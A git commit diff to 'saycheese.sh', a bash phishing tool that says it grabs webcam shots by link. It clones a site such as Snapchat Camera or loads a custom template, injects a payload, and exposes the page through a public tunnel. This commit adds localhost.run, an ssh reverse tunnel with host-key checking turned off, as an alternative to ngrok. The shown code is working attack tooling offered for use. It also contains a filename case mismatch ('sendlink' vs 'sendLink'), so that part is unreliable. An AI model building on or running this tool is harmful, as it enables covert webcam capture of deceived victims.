8cd7b376c30ac87e6cf23314ba9295d786bbffa6
Muhammad Fauzi <fauzi.padlaw@gmail.com>
2021-07-26 08:03:32 +0700

    added: localhost.run for port forwarding

--- saycheese.sh
+++ saycheese.sh
@@ -5,7 +5,7 @@
 # Github: https://github.com/fauzipadlaw/saycheese
 
 trap 'printf "\n";stop' 2
-
+version=$(cat version)
 banner() {
 
     printf "      \e[1;92m  ____              \e[0m\e[1;77m ____ _                          \e[0m\n"
@@ -18,7 +18,7 @@ banner() {
     printf "\e[1;77m               .:.:\e[0m\e[1;93m Grab webcam shots by link \e[0m\e[1;77m:.:.\e[0m\n"
     printf "\n"
     printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]      v1.0 coded by @linux_choice                                               \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
-    printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]      v2.0 mantained by github.com/fauzipadlaw                                  \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
+    printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]      v${version} mantained by github.com/fauzipadlaw                                  \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
     printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]      github.com/thelinuxchoice/saycheese(Repository Deleted)                   \e[0m\e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
     printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]      github.com/fauzipadlaw/saycheese (forked and active Repository)           \e[0m\e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
     printf "\n"
@@ -47,13 +47,17 @@ stop() {
     if [[ $checkssh == *'ssh'* ]]; then
         killall -2 ssh >/dev/null 2>&1
     fi
+
+    if [[ -e sendlink ]]; then
+        rm -rf sendlink
+    fi
     exit 1
 
 }
 
 dependencies() {
     command -v php >/dev/null 2>&1 || {
-        echo >&2 "I require php but it's not installed. Install it.(apt install php or https://www.php.net/manual/en/install.php) Aborting."
+        echo >&2 "I require php but it's not installed. Install it (https://www.php.net/manual/en/install.php) Aborting."
         exit 1
     }
 }
@@ -88,11 +92,11 @@ checkfound() {
 ngrok_server() {
     if [[ ! -e ngrok ]]; then
         command -v unzip >/dev/null 2>&1 || {
-            echo >&2 "I require unzip but it's not installed. Install it(apt install unzip or http://infozip.sourceforge.net/UnZip.html#Downloads). Aborting."
+            echo >&2 "I require unzip but it's not installed. Install it (http://infozip.sourceforge.net/UnZip.html#Downloads). Aborting."
             exit 1
         }
         command -v wget >/dev/null 2>&1 || {
-            echo >&2 "I require wget but it's not installed. Install it(apt install wget or https://www.gnu.org/software/wget/). Aborting."
+            echo >&2 "I require wget but it's not installed. Install it (https://www.gnu.org/software/wget/). Aborting."
             exit 1
         }
         printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
@@ -128,10 +132,10 @@ ngrok_server() {
         fi
     fi
 
-    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server(Turn On Hotspot if on termux) \e[0m\e[1;77m(localhost:3333)\e[0m\e[1;92m...\e[0m\n"
+    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server... \e[0m\e[1;77m(localhost:3333)\e[0m\e[1;92m...\e[0m\n"
     php -S 0.0.0.0:3333 >/dev/null 2>&1 &
     sleep 2
-    printf "\e[1;92m[\e[0m\e[1;77m+\e[1;92m] Starting ngrok server(Hotspot must be started) \e[0m\e[1;77m(http 3333)\e[0m\e[1;92m...\n"
+    printf "\e[1;92m[\e[0m\e[1;77m+\e[1;92m] Starting ngrok... \e[0m\e[1;77m(http 3333)\e[0m\e[1;92m...\n"
     ./ngrok http 3333 >/dev/null 2>&1 &
     sleep 10
 
@@ -139,6 +143,45 @@ ngrok_server() {
 
     if [[ -z $link ]]; then
         printf "\e[1;91m[!] Ngrok error, debug:\e[0m\e[1;77m ./ngrok http 3333\e[0m\n"
+        exit 1
+    fi
+    printf "\e[1;92m[\e[0m+\e[1;92m] Share \e[0m\e[1;77mHTTPS\e[0m\e[1;92m link:\e[0m\e[1;77m %s\e[0m\n" $link
+
+}
+
+localhost_run_server() {
+    command -v php >/dev/null 2>&1 || {
+        echo >&2 "I require php but it's not installed. Install it. Aborting."
+        exit 1
+    }
+    command -v ssh >/dev/null 2>&1 || {
+        echo >&2 "I require ssh but it's not installed. Install it. Aborting."
+        exit 1
+    }
+
+    if [[ -e sendlink ]]; then
+        rm -rf sendlink
+    fi
+    checkphp=$(ps aux | grep -o "php" | head -n1)
+    checkssh=$(ps aux | grep -o "ssh" | head -n1)
+    if [[ $checkphp == *'php'* ]]; then
+        killall -2 php >/dev/null 2>&1
+    fi
+    if [[ $checkssh == *'ssh'* ]]; then
+        killall -2 ssh >/dev/null 2>&1
+    fi
+
+    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server... \e[0m\e[1;77m(localhost:3333)\e[0m\e[1;92m...\e[0m\n"
+    php -S 0.0.0.0:3333 >/dev/null 2>&1 &
+    sleep 2
+    printf "\e[1;92m[\e[0m+\e[1;92m] Starting localhost.run...\e[0m\n"
+
+    $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 localhost.run 2> /dev/null > sendlink ' &
+    sleep 10
+    # link=$(grep -o "https://[0-9a-z]*\.localhost.run" sendlink)
+    link=$(cat sendLink | grep -o "https://[0-9a-z]*\.localhost.run")
+    if [[ -z $link ]]; then
+        printf "\e[1;91m[!] localhost.run! \e[0m\n"
         exit 1
     fi
     printf "\e[1;92m[\e[0m+\e[1;92m] Share \e[0m\e[1;77mHTTPS\e[0m\e[1;92m link:\e[0m\e[1;77m %s\e[0m\n" $link
@@ -158,13 +201,13 @@ start() {
     printf "\n"
     printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Mirror website\e[0m\n"
     printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Custom template(.html file)\e[0m\n"
-    default_option_server="1"
-    read -p $'\n\e[1;92m[\e[0m+\e[0m\e[1;92m] Choose an option: \e[0m' option_server
-    option_server="${option_server:-${default_option_server}}"
-    if [[ $option_server -eq 1 ]]; then
+    default_option_template="1"
+    read -p $'\n\e[1;92m[\e[0m+\e[0m\e[1;92m] Choose an option: \e[0m' option_template
+    option_template="${option_template:-${default_option_template}}"
+    if [[ $option_template -eq 1 ]]; then
 
         command -v httrack >/dev/null 2>&1 || {
-            echo >&2 "I require httrack: (apt-get install httrack or https://www.httrack.com/page/2/) "
+            echo >&2 "It requires httrack: (https://www.httrack.com/page/2/)"
             exit 1
         }
         default_website_mirror="https://snapcamera.snapchat.com"
@@ -178,11 +221,21 @@ start() {
 
         httrack --clean -Q -q -K -* --index -O websites/ $website_mirror >/dev/null 2>&1
         payload
-        ngrok_server
+        printf "\n"
+        printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m localhost.run\e[0m\n"
+        printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+        default_option_server="1"
+        read -p $'\n\e[1;92m[\e[0m+\e[0m\e[1;92m] Choose a port forwarder: \e[0m' option_server
+        option_server="${option_server:-${default_option_server}}"
+        if [[ $option_server -eq 1 ]]; then
+            localhost_run_server
+        else
+            ngrok_server
+        fi
         checkfound
 
     elif
-        [[ $option_server -eq 2 ]]
+        [[ $option_template -eq 2 ]]
     then
         default_website_template="saycheese.html"
         read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Template file: \e[0m' website_template
